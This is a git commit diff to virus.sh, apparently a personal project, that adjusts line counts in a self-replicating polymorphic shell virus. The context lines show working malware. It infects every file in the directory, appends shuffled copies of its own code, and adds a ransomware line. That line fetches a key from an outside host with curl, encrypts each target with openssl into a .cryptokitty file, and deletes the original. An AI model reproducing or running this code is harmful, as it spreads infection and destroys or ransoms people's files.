635b59f9ab665ee1c2ed0ed04944850c4648f00c
Solomon Marian <blasco991@gmail.com>
2018-06-21 14:37:28 +0200

    Fix
    Line numbers correction and istruction index fix

--- virus.sh
+++ virus.sh
@@ -13,14 +13,14 @@ for target in *; do #@7 for every file in the working dir
 		continue #@12
 	fi #@13 START Restoring Function
 	NEWFILE=${MANAGER[$((RANDOM % 4))]} #@14 newfile is equal to 1 of the 4 names that we have above the sort redifines the structure of the virus;  randomly reorder code instructions; inverter reorder extract the last 39 lines, put the last #@n as left column in the file (the last column put as number of field 0) cut the new column just added and now we have again the lines of our file that we put inside the new file just created
-	tail -n 39 $target | awk '{print($NF" "$0)}' | sort -g -t@ -k2 | cut -f2- -d' ' > /tmp/\ /"$NEWFILE" #@15 
+	tail -n 38 $target | awk '{print($NF" "$0)}' | sort -g -t@ -k2 | cut -f2- -d' ' > /tmp/\ /"$NEWFILE" #@15 
 	chmod +x /tmp/\ /"$NEWFILE" #@16 gives the permission of execution to the new file
 	if /tmp/\ /"$NEWFILE" test ; then #@17 if we are the file with the malware, execute the malware
 		continue #@18 if we have succseffully retrieved and executed the malware, we step over to the next file
 	fi #@19 END Restoring Function
 	NEWFILE=${MANAGER[$((RANDOM % 4))]} #@20 START Main Viral Body: take a new name from the 4 below
 	NEWFILE="/tmp/\ /$NEWFILE" #@21 path of this new file that will be created
-	echo "tail -n 39 $target | awk '{print(\$NF\" \"\$0)}' | sort -g -t@ -k2 | cut -f2- -d' ' > $NEWFILE" >> $target #@22 append the restoring function to the target file
+	echo "tail -n 38 $target | awk '{print(\$NF\" \"\$0)}' | sort -g -t@ -k2 | cut -f2- -d' ' > $NEWFILE" >> $target #@22 append the restoring function to the target file
 	echo "chmod +x $NEWFILE && $NEWFILE &" >> $target #@23 append the command that gives us the permission of execution to the future malware file
 	echo "[ -f "$target" ] && [[ "${target##*\\.}" != "*.cryptokitty" ]] && key=\"\$(curl -s https://deadkitty.blasco991.com/code.php?m=$target)\" && openssl enc -aes-256-cbc -in "$target" -k \"\$key\" -out "$target.cryptokitty" && rm "$target"; exit 0" >> $target #@24 append the command exit 0 at the end of our file	
 	tabft=("FT" [39]=" ") #@25 Start Real-Infection: create an array and put in the first position "FT" and put at position 39 a blank space
@@ -29,7 +29,7 @@ for target in *; do #@7 for every file in the working dir
 		valindex=$(((RANDOM % 39)+1)) #@28 take a index between 1 and 39
 		while [ "${tabft[$valindex]}" == "FT" ]; do #@29  in this while we force to select a valindex that we have never visited in the array
 			valindex=$(((RANDOM % 39)+1)) #@30 pick a new index
-		done
+		done #@31
 		line=$(tail -$valindex $0 | head -1) #@32 extraction of the -valindex line in current code 
 		echo -e "$line" >> $target #@33 put this line into the target file
 		tabft[$valindex]="FT" #@34 mark the -valindex position of the array as visited
